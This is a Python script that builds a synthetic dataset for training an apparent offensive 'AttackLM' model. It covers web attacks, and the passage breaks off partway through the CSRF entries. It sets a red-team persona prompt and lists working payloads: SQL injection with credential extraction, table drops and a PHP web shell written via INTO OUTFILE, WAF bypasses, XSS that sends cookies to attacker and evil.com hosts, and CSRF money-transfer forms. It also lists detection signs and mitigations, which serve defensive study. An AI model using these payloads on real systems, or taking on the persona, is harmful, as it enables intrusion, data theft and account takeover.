#!/usr/bin/env python3
"""acquire_web_attack_dataset.py — Download or generate web application attack
training pairs in AttackLM bucket format.

Covers: SQL injection, XSS, CSRF, command injection, path traversal, IDOR, SSRF.

Output: data/datasets/buckets/web_app/attacks/data_synth.jsonl
        data/datasets/buckets/web_app/attacks/metadata.json

Usage:
    python scripts/acquire_web_attack_dataset.py
    python scripts/acquire_web_attack_dataset.py --fallback  # skip HF download
    python scripts/acquire_web_attack_dataset.py --count 10   # 10 variants per attack
"""

from __future__ import annotations

import argparse
import json
import random
import sys
from datetime import datetime, timezone
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
BUCKET_DIR = BASE_DIR / "data" / "datasets" / "buckets" / "web_app" / "attacks"
DATA_FILE = BUCKET_DIR / "data_synth.jsonl"
META_FILE = BUCKET_DIR / "metadata.json"

SEED = 42
SOURCE_NAME = "web_attack_synthetic"
LICENSE = "MIT"
SYSTEM_PROMPT = (
    "You are an authorized Red Team WEB APP specialist. "
    "You provide precise adversary emulation techniques for security validation."
)

ENVIRONMENT_TYPES = [
    "enterprise web application",
    "SaaS platform",
    "e-commerce site",
    "financial services API",
    "healthcare portal",
    "government system",
    "educational platform",
    "microservices architecture",
    "legacy application",
    "cloud-native application",
]

SEVERITY_LEVELS = [
    "critical",
    "high",
    "medium",
    "low",
]

TESTING_FRAMEWORKS = [
    "OWASP Testing Guide",
    "MITRE ATT&CK",
    "NIST SP 800-115",
    "PTES",
    "OSSTMM",
    "Bug Bounty methodology",
]

WEB_ATTACKS: list[dict] = [
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "Classic SQL Injection",
        "desc": "Injecting SQL commands through user input fields to manipulate the database.",
        "steps": "1. Identify injectable parameter: add `'` to input fields and observe errors\n2. Confirm injection: `1' OR '1'='1` returns all rows\n3. Enumerate columns: `1' ORDER BY 1--` incrementing until error\n4. Extract data: `UNION SELECT username,password FROM users--`\n5. Verify with: `1' UNION SELECT table_name FROM information_schema.tables--`",
        "payloads": [
            "`' OR '1'='1' --`",
            "`' UNION SELECT username, password FROM users --`",
            "`1'; DROP TABLE users; --`",
            "`admin'--`",
            "`1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`",
        ],
        "detection": [
            "Error messages revealing SQL syntax",
            "Unexpected number of rows returned",
            "Database error codes in HTTP responses (500, 400)",
            "WAF SQL pattern matches",
        ],
        "mitigations": [
            "Parameterized queries / prepared statements",
            "ORM usage",
            "Input validation and sanitization",
            "Least privilege database accounts",
            "WAF with SQL injection rules",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "Blind SQL Injection (Boolean-Based)",
        "desc": "Inferring database content through true/false responses.",
        "steps": "1. Test for boolean injection: `1' AND 1=1--` (true) vs `1' AND 1=2--` (false)\n2. Extract character by character: `1' AND SUBSTRING(username,1,1)='a'--`\n3. Automate with sqlmap: `sqlmap -u 'http://target/page?id=1' --technique=B --dbs`\n4. Extract table names: iterate through `information_schema.tables`",
        "payloads": [
            "`1' AND 1=1--`",
            "`1' AND SUBSTRING(database(),1,1)='s'--`",
            "`1' AND (SELECT LENGTH(username) FROM users LIMIT 1)>5--`",
            "`1' AND ASCII(SUBSTRING(username,1,1))>65--`",
        ],
        "detection": [
            "Different response sizes for true vs false conditions",
            "Time difference in response times",
            "Multiple similar requests with systematic variation",
        ],
        "mitigations": [
            "Parameterized queries",
            "Consistent error pages",
            "Rate limiting",
            "Input type enforcement",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "Blind SQL Injection (Time-Based)",
        "desc": "Inferring database content through response time delays.",
        "steps": "1. Test time-based injection: `1' AND SLEEP(5)--`\n2. Confirm: compare response time with and without SLEEP\n3. Extract data: `1' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--`\n4. Automate: `sqlmap -u 'http://target/page?id=1' --technique=T --dbs`",
        "payloads": [
            "`1' AND SLEEP(5)--`",
            "`1' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--`",
            "`1'; WAITFOR DELAY '0:0:5'--`",
            "`1' AND BENCHMARK(5000000,SHA1('test'))--`",
        ],
        "detection": [
            "Abnormal response times matching injection payloads",
            "SLEEP/BENCHMARK keywords in requests",
            "Multiple requests with time delays",
        ],
        "mitigations": [
            "Parameterized queries",
            "Query timeout settings",
            "Database monitoring for SLEEP calls",
            "WAF time-based injection rules",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection (Error-Based)",
        "desc": "Extracting data through database error messages.",
        "steps": "1. Trigger error: `1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`\n2. Extract version: `1' AND 1=CONVERT(int,@@version)--`\n3. Extract column names: `1' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--`\n4. Automate: `sqlmap -u 'http://target/page?id=1' --technique=E --dbs`",
        "payloads": [
            "`1' AND 1=CONVERT(int,@@version)--`",
            "`1' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--`",
            "`1' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--`",
        ],
        "detection": [
            "Verbose database error messages in HTTP responses",
            "Type conversion errors",
            "Information schema references in errors",
        ],
        "mitigations": [
            "Generic error pages in production",
            "Parameterized queries",
            "Error logging without exposing details",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "Second-Order SQL Injection",
        "desc": "Injection payload is stored and executed in a different context.",
        "steps": "1. Inject payload into registration form: username=`admin'--`\n2. Payload stored safely in database initially\n3. When username used in a different query (e.g., password change), injection executes\n4. Password change: `UPDATE users SET password='<new>' WHERE username='admin'--'`\n5. This changes the admin password instead of the intended user",
        "payloads": [
            "`admin'--` (as username)",
            "`admin'+OR+'1'='1` (stored in profile field)",
            "`'; DROP TABLE sessions;--` (stored in comment)",
        ],
        "detection": [
            "Input stored and later used unsanitized in different queries",
            "Unexpected query behavior with stored data",
            "Different contexts using same data without re-parameterization",
        ],
        "mitigations": [
            "Parameterized queries in ALL contexts, not just first insertion",
            "Input sanitization at every query point",
            "Stored input validation and escaping",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection with UNION-Based Data Extraction",
        "desc": "Using UNION SELECT to append additional query results to the original result set for data extraction.",
        "steps": "1. Determine column count: `1' ORDER BY 1--` increment until error\n2. Identify displayable columns: `1' UNION SELECT 1,2,3--`\n3. Extract database version: `1' UNION SELECT @@version,2,3--`\n4. Extract table names: `1' UNION SELECT table_name,2,3 FROM information_schema.tables--`\n5. Extract credentials: `1' UNION SELECT username,password,3 FROM users--`",
        "payloads": [
            "`1' UNION SELECT 1,2,3--`",
            "`1' UNION SELECT @@version,user(),database()--`",
            "`1' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--`",
            "`1' UNION SELECT username,password,3 FROM users--`",
        ],
        "detection": [
            "UNION SELECT keyword sequences in requests",
            "Additional columns appearing in responses",
            "Information schema queries in database logs",
            "WAF UNION injection pattern matches",
        ],
        "mitigations": [
            "Parameterized queries",
            "Strict result set validation",
            "WAF with UNION-based injection rules",
            "Database account least privilege",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection with Stacked Queries",
        "desc": "Executing multiple SQL statements in a single injection by separating them with semicolons.",
        "steps": "1. Test semicolon execution: `1'; SELECT 1--`\n2. Insert data: `1'; INSERT INTO users(username,password) VALUES('hacker','pwned')--`\n3. Modify data: `1'; UPDATE users SET role='admin' WHERE username='hacker'--`\n4. Create new objects: `1'; CREATE TABLE backdoor(cmd TEXT)--`\n5. Automate: `sqlmap -u 'http://target/page?id=1' --technique=S --dbs`",
        "payloads": [
            "`1'; SELECT 1--`",
            "`1'; INSERT INTO users(username,password) VALUES('hacker','pwned')--`",
            "`1'; UPDATE users SET role='admin' WHERE username='hacker'--`",
            "`1'; DROP TABLE logs;--`",
        ],
        "detection": [
            "Multiple SQL statements in single request parameter",
            "Semicolons followed by SQL keywords in input",
            "Unexpected INSERT/UPDATE/DELETE in query logs",
            "Database audit logs showing stacked query execution",
        ],
        "mitigations": [
            "Disable multi-statement execution in database driver",
            "Parameterized queries",
            "Least privilege database accounts",
            "Input validation rejecting semicolons in parameters",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection with OUTFILE/Webshell",
        "desc": "Writing files to the server via SQL injection using INTO OUTFILE to deploy web shells.",
        "steps": "1. Confirm FILE privilege: `1' UNION SELECT grantee,is_grantable FROM mysql.user--`\n2. Write web shell: `1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--`\n3. Access web shell: `http://target/shell.php?cmd=id`\n4. Alternative with DUMPFILE: `1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO DUMPFILE '/var/www/html/s.php'--`\n5. Verify access and execute commands through the deployed shell",
        "payloads": [
            "`1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--`",
            "`1' UNION SELECT '<?php eval($_POST[\"c\"]); ?>' INTO OUTFILE '/var/www/html/x.php'--`",
            "`1' UNION SELECT '' INTO DUMPFILE '/var/www/html/s.php'--`",
        ],
        "detection": [
            "INTO OUTFILE / INTO DUMPFILE keywords in requests",
            "Unexpected PHP/JSP files created in web root",
            "Database audit logs showing FILE privilege usage",
            "Web shell access patterns in access logs",
        ],
        "mitigations": [
            "Revoke FILE privilege from application database accounts",
            "Restrict MySQL secure_file_priv setting",
            "File integrity monitoring on web root",
            "WAF blocking INTO OUTFILE patterns",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection with WAF Bypass (Spaceless, Comment-Based, Encoding)",
        "desc": "Bypassing Web Application Firewalls using spaceless syntax, comment injection, and encoding tricks.",
        "steps": "1. Test spaceless: `1'/**/UNION/**/SELECT/**/1,2,3--`\n2. Comment-based: `1'/*!UNION*//*!SELECT*/1,2,3--`\n3. Encoding bypass: `1'%55NION%20%53ELECT%201,2,3--`\n4. Double encoding: `1'%2555NION%2520%2553ELECT%25201,2,3--`\n5. Keyword splitting: `1'UNI%0AON SEL%0AECT 1,2,3--`",
        "payloads": [
            "`1'/**/UNION/**/SELECT/**/1,2,3--`",
            "`1'/*!UNION*//*!SELECT*/1,2,3--`",
            "`1'%55NION%20%53ELECT%201,2,3--`",
            "`1'UNI%0AON SEL%0AECT 1,2,3--`",
            "`1'UniOn SeLect 1,2,3--`",
        ],
        "detection": [
            "SQL keywords with inline comments (/**/) in requests",
            "MySQL version comments (/*!*/) in input",
            "URL-encoded SQL keywords in parameters",
            "Newline/tab characters within SQL keywords",
        ],
        "mitigations": [
            "WAF with decoded-content inspection",
            "Normalization of input before WAF analysis",
            "Parameterized queries as primary defense",
            "Request body size and pattern anomaly detection",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection in HTTP Headers (Cookie, User-Agent, Referer)",
        "desc": "Exploiting SQL injection in HTTP request headers that are unsafely used in database queries.",
        "steps": "1. Test Cookie header: `Cookie: session=1' OR '1'='1`\n2. Test User-Agent: `User-Agent: ' OR 1=1--`\n3. Test Referer: `Referer: http://x' UNION SELECT 1,2,3--`\n4. Test X-Forwarded-For: `X-Forwarded-For: 1' AND SLEEP(5)--`\n5. Automate: `sqlmap -u 'http://target/page' --level=5 --risk=3 --headers='User-Agent:*'`",
        "payloads": [
            "`Cookie: session=1' OR '1'='1`",
            "`User-Agent: ' OR 1=1--`",
            "`Referer: http://x' UNION SELECT 1,2,3--`",
            "`X-Forwarded-For: 1' AND SLEEP(5)--`",
        ],
        "detection": [
            "SQL patterns in HTTP headers",
            "Database errors triggered by modified headers",
            "Anomalous header values with SQL syntax",
            "WAF logs showing header-based injection attempts",
        ],
        "mitigations": [
            "Sanitize all HTTP header values before database use",
            "Parameterized queries for header-derived values",
            "WAF inspection of all request headers",
            "Avoid logging headers directly into database queries",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection in ORDER BY",
        "desc": "Exploiting SQL injection in ORDER BY clauses where user input controls sort order.",
        "steps": "1. Test ORDER BY injection: `?sort=1` then `?sort=1'` (observe errors)\n2. Conditional extraction: `?sort=IF(1=1,id,username)`\n3. Time-based: `?sort=IF(SUBSTRING(database(),1,1)='s',SLEEP(5),id)`\n4. Error-based: `?sort=EXTRACTVALUE(1,CONCAT(0x7e,@@version))`\n5. Automate: `sqlmap -u 'http://target/page?sort=1' --technique=TE`",
        "payloads": [
            "`?sort=IF(1=1,id,username)`",
            "`?sort=IF(SUBSTRING(database(),1,1)='s',SLEEP(5),id)`",
            "`?sort=EXTRACTVALUE(1,CONCAT(0x7e,@@version))`",
            "`?sort=1 PROCEDURE ANALYSE()`",
        ],
        "detection": [
            "IF/SLEEP/CASE keywords in ORDER BY parameters",
            "Conditional expressions in sort parameters",
            "Time delays correlating with ORDER BY injection",
            "Database errors from malformed ORDER BY values",
        ],
        "mitigations": [
            "Whitelist allowed sort columns",
            "Map sort parameters to column names server-side",
            "Parameterized queries with explicit ORDER BY validation",
            "Reject numeric sort parameters that contain SQL syntax",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection with HAVING/GROUP BY",
        "desc": "Exploiting SQL injection in HAVING and GROUP BY clauses commonly used in reporting and analytics queries.",
        "steps": "1. Test GROUP BY injection: `?group=1' HAVING 1=1--`\n2. Extract column names: `?group=1' GROUP BY username HAVING username='admin'--`\n3. Conditional extraction via HAVING: `?group=1' HAVING SUBSTRING(database(),1,1)='s'--`\n4. Error-based via HAVING: `?group=1' HAVING 1=CONVERT(int,@@version)--`\n5. Time-based: `?group=1' HAVING IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--`",
        "payloads": [
            "`1' HAVING 1=1--`",
            "`1' GROUP BY username HAVING username='admin'--`",
            "`1' HAVING 1=CONVERT(int,@@version)--`",
            "`1' HAVING IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--`",
        ],
        "detection": [
            "HAVING/GROUP BY keywords with SQL syntax in parameters",
            "Conditional expressions in aggregate query parameters",
            "Database errors from HAVING clause manipulation",
            "Time delays correlating with HAVING injection attempts",
        ],
        "mitigations": [
            "Whitelist allowed GROUP BY/HAVING column names",
            "Parameterized queries for aggregate functions",
            "Input validation rejecting SQL keywords in group/having parameters",
            "Server-side mapping of parameter values to column names",
        ],
    },
    {
        "category": "sql_injection",
        "mitre_ids": ["T1190.001"],
        "name": "SQL Injection in NoSQL (MongoDB)",
        "desc": "Injecting NoSQL operators to manipulate MongoDB queries.",
        "steps": '1. Test NoSQL injection: `{"$gt": ""}` returns all documents\n2. Authentication bypass: `username=admin&password[$ne]=1`\n3. Operator injection: `{"$where": "this.password.match(/.*/)"}`\n4. Data extraction: `{"$regex": "^a"}` to enumerate character by character\n5. Automate with nosqlmap: `python nosqlmap.py -u \'http://target/api?param=value\'`',
        "payloads": [
            "`password[$ne]=1`",
            '`{"$gt": ""}`',
            '`{"$where": "this.password.match(/.*/)}"`',
            '`{"$regex": "^admin"}`',
        ],
        "detection": [
            "NoSQL operator keywords in requests ($ne, $gt, $regex, $where)",
            "Unexpected query results returning all documents",
            "MongoDB error messages in responses",
        ],
        "mitigations": [
            "Input validation and type checking",
            "Sanitize user input to prevent operator injection",
            "Use ORM/ODM with parameterized queries",
            "Least privilege database accounts",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "Reflected XSS",
        "desc": "Injecting malicious scripts that are reflected off the web server in the response.",
        "steps": "1. Find reflected input: test `<script>alert(1)</script>` in search parameters\n2. Identify context: HTML body, attribute, JavaScript string\n3. Bypass filters: `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`\n4. Steal cookies: `<script>fetch('http://attacker/?c='+document.cookie)</script>`\n5. Encode for delivery: URL encode the payload for phishing links",
        "payloads": [
            "`<script>alert('XSS')</script>`",
            "`<img src=x onerror=alert(1)>`",
            "`<svg/onload=alert(1)>`",
            "`javascript:alert(1)` (in href)",
            "`<body onload=alert(1)>`",
        ],
        "detection": [
            "Script tags in reflected parameters",
            "Event handler attributes in URL parameters",
            "JavaScript: URIs in links",
            "Content Security Policy violations",
        ],
        "mitigations": [
            "Output encoding based on context (HTML, JS, URL, CSS)",
            "Content Security Policy (CSP)",
            "HTTPOnly + Secure cookies",
            "Input validation",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "Stored XSS",
        "desc": "Injecting malicious scripts that are stored on the server and served to other users.",
        "steps": "1. Inject persistent payload in user profile, comment, or message fields\n2. Use polyglot payload for broad coverage: `javascript:/*--></title></style></textarea></script><svg/onload='+alert(1)+'>`\n3. Bypass WAF with encoding: `<div id=\"x\" onmouseover=\"alert(1)\">test</div>`\n4. Session hijacking payload: `<script>new Image().src='http://evil.com/?c='+document.cookie</script>`\n5. Verify persistence: refresh page and confirm script executes",
        "payloads": [
            "`<script>fetch('http://attacker/?c='+document.cookie)</script>`",
            "`<img src=x onerror=\"fetch('http://attacker/?c='+document.cookie)\">`",
            "`<svg onload=alert(document.domain)>`",
            "`<details open ontoggle=alert(1)>`",
        ],
        "detection": [
            "Stored script content in database",
            "XSS payload signatures in user-generated content",
            "Unexpected JavaScript execution on page load",
            "CSP violation reports",
        ],
        "mitigations": [
            "HTML sanitization (DOMPurify)",
            "Content Security Policy",
            "Input validation on storage",
            "Context-aware output encoding",
            "HTTPOnly cookies",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "DOM-Based XSS",
        "desc": "Client-side XSS where the vulnerability is in the DOM, not the server response.",
        "steps": "1. Find DOM sinks: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`\n2. Identify sources: `location.hash`, `location.search`, `document.referrer`\n3. Craft payload: `http://target/page#<img src=x onerror=alert(1)>`\n4. Trace data flow from source to sink using browser DevTools\n5. Exploit: `http://target/page#default=<script>alert(document.cookie)</script>`",
        "payloads": [
            "`http://target/page#<img src=x onerror=alert(1)>`",
            "`http://target/page?q=<script>alert(1)</script>`",
            "`javascript:alert(document.domain)` (in DOM context)",
        ],
        "detection": [
            "DOM manipulation with unsanitized input",
            "Source-to-sink data flow in JavaScript",
            "Client-side template injection",
        ],
        "mitigations": [
            "Use textContent instead of innerHTML",
            "DOMPurify for dynamic HTML",
            "Avoid eval() and similar sinks",
            "Secure DOM manipulation patterns",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "XSS Filter Evasion Techniques",
        "desc": "Techniques to bypass XSS filters and WAF protections.",
        "steps": '1. Test basic payload: `<script>alert(1)</script>`\n2. If blocked, try event handlers: `<img src=x onerror=alert(1)>`\n3. If attributes blocked, try SVG: `<svg/onload=alert(1)>`\n4. If angle brackets blocked: `" onfocus=alert(1) autofocus="`\n5. If keywords filtered, try: `<ScRiPt>alert(1)</sCrIpT>`, `alert\\`document.domain\\``, `<img src=x onerror=alert(1)>`',
        "payloads": [
            "`<img src=x onerror=alert(1)>`",
            "`<svg/onload=alert(1)>`",
            "`<details open ontoggle=alert(1)>`",
            "`<body/onload=alert(1)>`",
            "`<marquee onstart=alert(1)>`",
            "`<input/onfocus=alert(1) autofocus>`",
        ],
        "detection": [
            "Multiple XSS payload variations from same source IP",
            "Event handler attributes in URL parameters",
            "HTML entity encoding of script tags",
            "Polyglot XSS payloads",
        ],
        "mitigations": [
            "Context-aware output encoding",
            "Content Security Policy",
            "HTTPOnly + Secure cookies",
            "Modern WAF with XSS pattern detection",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "Mutation XSS (mXSS)",
        "desc": "Exploiting differences in HTML parsing between browser engines to bypass sanitization during DOM mutation.",
        "steps": "1. Understand DOM mutation: browsers may re-serialize HTML differently than parsed\n2. Test mutation vectors: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`\n3. Exploit namespace confusion: SVG/MathML elements cause parsing context switches\n4. Test sanitizer-specific mutations: DOMPurify 2.x had mXSS via `<svg></p><style><a>`\n5. Verify: payload appears benign to sanitizer but mutates into executable JS in DOM",
        "payloads": [
            "`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`",
            '`<svg></p><style><a id="</style><img src=1 onerror=alert(1)>`',
            '`<noscript><p title="</noscript><img src=x onerror=alert(1)>`',
            "`<math><mrow><mtext><img src=x onerror=alert(1)>`",
        ],
        "detection": [
            "Namespace-switching HTML elements in user input",
            "SVG/MathML elements combined with script content",
            "Sanitizer bypass patterns in CSP violation reports",
            "HTML parsing inconsistencies across browsers",
        ],
        "mitigations": [
            "Use latest DOMPurify (3.x+) with mXSS fixes",
            "Trusted Types API enforcement",
            "Strict Content Security Policy",
            "Server-side HTML sanitization as defense-in-depth",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "Stored XSS via File Upload",
        "desc": "Uploading files containing XSS payloads that execute when the file is served to other users.",
        "steps": "1. Upload HTML file with XSS: `<html><body><script>alert(document.cookie)</script></body></html>`\n2. Upload SVG with embedded JS: `<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>`\n3. Upload image with XSS metadata or polyglot file\n4. Test if uploaded files are served with correct Content-Type or as text/html\n5. Test if file is processed server-side (e.g., image resize) and errors leak XSS",
        "payloads": [
            "`upload: xss.html with <script>alert(document.domain)</script>`",
            "`upload: xss.svg with <svg onload=alert(1)>`",
            "`upload: xss.gif (GIF header + HTML script payload)`",
            "`upload: xss.xlsx with XSS in cell formulas/links`",
        ],
        "detection": [
            "HTML/JS content in uploaded non-HTML files",
            "SVG files with event handlers or script elements",
            "Uploaded files served with text/html Content-Type",
            "Polyglot file signatures in uploads",
        ],
        "mitigations": [
            "Force correct Content-Type on file serving",
            "Content-Disposition: attachment for uploads",
            "Sanitize SVG uploads (remove scripts/event handlers)",
            "Serve user uploads from separate domain",
            "Image processing/re-encoding on upload",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "XSS in SVG",
        "desc": "Injecting JavaScript through SVG file features including event handlers, foreignObject, and embedded scripts.",
        "steps": "1. Test SVG event handlers: `<svg onload=alert(1)>`\n2. Use SVG script element: `<svg><script>alert(1)</script></svg>`\n3. Exploit foreignObject: `<svg><foreignObject><body onload=alert(1)></foreignObject></svg>`\n4. SVG animate/set: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`\n5. SVG use/xlink: `<svg><use xlink:href='data:image/svg+xml,<svg onload=alert(1)>'`",
        "payloads": [
            "`<svg onload=alert(1)>`",
            "`<svg><script>alert(1)</script></svg>`",
            "`<svg><foreignObject><body onload=alert(1)></foreignObject></svg>`",
            "`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`",
            "`<svg><set attributename=onmouseover to=alert(1)>`",
        ],
        "detection": [
            "SVG files containing script elements or event handlers",
            "SVG foreignObject with HTML/JS content",
            "SVG animate/set with JavaScript execution",
            "Content-Type mismatches on SVG serving",
        ],
        "mitigations": [
            "Strip scripts and event handlers from uploaded SVGs",
            "Serve SVGs with image/svg+xml Content-Type",
            "SVG sanitization libraries (svgo, sanitize-svg)",
            "CSP with script-src restrictions",
            "Disallow SVG uploads or process server-side only",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "XSS via Server-Side Template Injection (SSTI to XSS)",
        "desc": "Exploiting server-side template injection that renders XSS payloads after template processing.",
        "steps": "1. Detect SSTI: test `{{7*7}}` → look for `49` in response\n2. Identify engine: `{{config}}`, `${7*7}`, `<%= 7*7 %>`\n3. Achieve XSS via SSTI: `{{'<script>alert(1)</script>'}}` (template renders raw)\n4. Jinja2 RCE→XSS: `{{config.__class__.__init__.__globals__['os'].popen('echo <script>alert(1)</script>').read()}}`\n5. Twig SSTI→XSS: `{{'<script>alert(1)</script>'|raw}}`",
        "payloads": [
            "`{{7*7}}` (SSTI detection)",
            "`{{'<script>alert(1)</script>'}}` (Jinja2 XSS)",
            "`{{'<script>alert(1)</script>'|raw}}` (Twig XSS)",
            "`${'<script>alert(1)</script>'}` (Freemarker/Velocity)",
            "`<%= '<script>alert(1)</script>' %>` (ERB XSS)",
        ],
        "detection": [
            "Template syntax in user input ({{, ${, <%)",
            "Arithmetic expression evaluation in responses",
            "Template engine error messages",
            "Unexpected HTML rendering from template context",
        ],
        "mitigations": [
            "Use sandboxed template environments",
            "Auto-escaping enabled by default in templates",
            "Input validation rejecting template syntax",
            "Never render user-controlled templates",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "XSS via DOM Clobbering",
        "desc": "Overwriting DOM properties using named HTML elements to interfere with security controls or hijack execution flows.",
        "steps": "1. Identify DOM properties used by security code: `window.config`, `document.scripts`\n2. Clobber with named elements: `<form id=config><input name=apiEndpoint value='http://evil'>`\n3. Overwrite security variables: `<a id=safeHTML href='javascript:alert(1)'>`\n4. Clobber `toString`/`valueOf`: `<form id=x><input name=toString value='<script>alert(1)</script>'>`\n5. Combine with other XSS: clobber CSP enforcement variables",
        "payloads": [
            "`<form id=config><input name=apiEndpoint value='http://evil'>`",
            "`<a id=safeHTML href='javascript:alert(1)'>`",
            "`<img id=csp src=x name=reportUri value='http://evil'>`",
            "`<form id=x><input name=toString value='evil'>`",
        ],
        "detection": [
            "Named HTML elements with security-sensitive IDs",
            "Form inputs with names matching global variables",
            "DOM property access patterns in JavaScript that can be clobbered",
            "Unexpected global variable values after DOM manipulation",
        ],
        "mitigations": [
            "Use strict mode and `===` comparisons",
            "Access DOM elements via querySelector not named properties",
            "Use `Object.defineProperty` to protect critical globals",
            "Content Security Policy as defense-in-depth",
            "Validate DOM property values before use",
        ],
    },
    {
        "category": "xss",
        "mitre_ids": ["T1059.007"],
        "name": "XSS in PDF Generation",
        "desc": "Injecting JavaScript into server-side PDF generation pipelines that execute in PDF viewers or during HTML-to-PDF conversion.",
        "steps": "1. Identify PDF generation: look for exported reports, invoices, or downloadable PDFs\n2. Test HTML-to-PDF injection: inject `<script>alert(1)</script>` in user content rendered to PDF\n3. Test PDF JavaScript: inject `javascript:alert(1)` in link annotations\n4. Exploit wkhtmltopdf: `<script>document.location='http://evil/?c='+document.cookie</script>`\n5. Test PhantomJS/Chrome headless: `<iframe src='javascript:alert(1)'>` in rendered content",
        "payloads": [
            "`<script>alert(1)</script>` (in PDF-rendered HTML)",
            "`<iframe src='javascript:alert(1)'>`",
            "`<link rel=import href='http://evil/xss.html'>` (wkhtmltopdf)",
            "`javascript:alert(1)` (in PDF link annotation)",
        ],
        "detection": [
            "JavaScript in content passed to PDF generators",
            "iframe/javascript URIs in PDF-rendered HTML",
            "wkhtmltopdf/PhantomJS version headers in PDF metadata",
            "Unexpected network requests during PDF generation",
        ],
        "mitigations": [
            "Use modern headless Chrome with sandbox flags",
            "Sanitize HTML before passing to PDF generator",
            "Disable JavaScript in PDF generation engine",
            "Use dedicated PDF libraries (not HTML-to-PDF converters) for user content",
            "Network isolation for PDF generation service",
        ],
    },
    {
        "category": "csrf",
        "mitre_ids": ["T1534"],
        "name": "Cross-Site Request Forgery",
        "desc": "Tricking a user into performing actions on a web application they are authenticated to.",
        "steps": "1. Identify state-changing endpoints (POST, PUT, DELETE)\n2. Verify CSRF protection: check for tokens in forms/headers\n3. Craft CSRF payload: `<form action='https://target/api/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'></form>`\n4. Host on attacker site: embed auto-submitting form\n5. Deliver to victim via phishing or XSS",
        "payloads": [
            "`<form action='https://target/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'><script>document.forms[0].submit()</script></form>`",
            "`<img src='https://target/api/action?param=value'>` (GET-based)",
            "`<fetch('https://target/api/action', {method:'POST', credentials:'include', body:'param=value'})>`",
        ],
        "detection": [
            "Missing or invalid CSRF tokens on state-changing requests",
            "Same-site cookie misconfiguration",
            "Accepting state changes via GET requests",
        ],
        "mitigations": [
            "Anti-CSRF tokens on all state-changing forms",
            "SameSite cookie attribute (Strict/Lax)",
            "Custom request headers (X-Requested-With)",
            "Re-authentication for sensitive actions",
        ],
    },
    {
        "category": "csrf",
        "mitre_ids": ["T1534"],
        "name": "JSON CSRF Attack",
        "desc": "CSRF attack against JSON-based APIs.",
        "steps": '1. Identify JSON endpoint: `POST /api/transfer {"amount": 1000, "to": "attacker"}`\n2. Attempt JSON CSRF: browser will set Content-Type to text/plain for form-based\n3. Flash-based JSON CSRF (legacy): craft SWF that sends JSON with correct Content-Type\n4. CORS misconfiguration CSRF: if API sends `Access-Control-Allow-Origin: *` with credentials\n5. Deliver crafted request via XSS or phishing',
        "payloads": [
            "`<form action='https://target/api/transfer' method='POST' enctype='text/plain'><textarea name='{\"amount\":1000,\"to\":\"attacker\"}'>test</textarea></form>`",
            "`fetch('https://target/api/transfer', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({amount:1000,to:'attacker'})})`",
        ],
        "detection": [
            "JSON endpoints without CSRF protection",
            "CORS allowing credential-bearing requests from arbitrary origins",
            "Accepting Content-Type text/plain",
        ],
        "mitigations": [
            "CSRF tokens in custom headers for JSON APIs",
            "SameSite cookies",
            "CORS proper configuration",
            "Verify Content-Type header",
        ],
    },
    {
        "category": "csrf",
        "mitre_ids": ["T1534"],
        "name": "CSRF with JSON Content Type",
